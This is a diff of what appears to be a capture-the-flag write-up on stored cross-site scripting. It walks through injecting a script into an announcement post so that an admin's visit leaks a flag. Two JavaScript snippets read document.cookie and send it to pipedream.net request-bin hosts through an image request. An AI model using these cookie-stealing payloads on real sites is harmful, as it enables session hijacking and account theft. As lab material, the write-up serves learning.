@@ -29,14 +29,16 @@ var i = new Image();
 - Error = Input script
 - Annoucement and create content "<script>alert(1)</script>" on the subject.
 - When you click it, the alert shows up.
-- Instead of alert(1), put var i = new Image(); i.src = "HTTP://en7riltg206nc.x.pipedream.net/getCrred.php?cookie=" + cookieData;
+- Instead of alert(1), put
+```javascript
+var i = new Image(); i.src = "HTTP://en7riltg206nc.x.pipedream.net/getCrred.php?cookie=" + cookieData;
+```
 - In BurpSuite, instead of alert(1), put the below code
 ```javascript
 var cookieData = document.cookie; 
 var i = new Image();
 i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
 ```
-
 - On the admin visit url = type the address made by the attack post
 - Check the flag on https://public.requestbin.com/
 
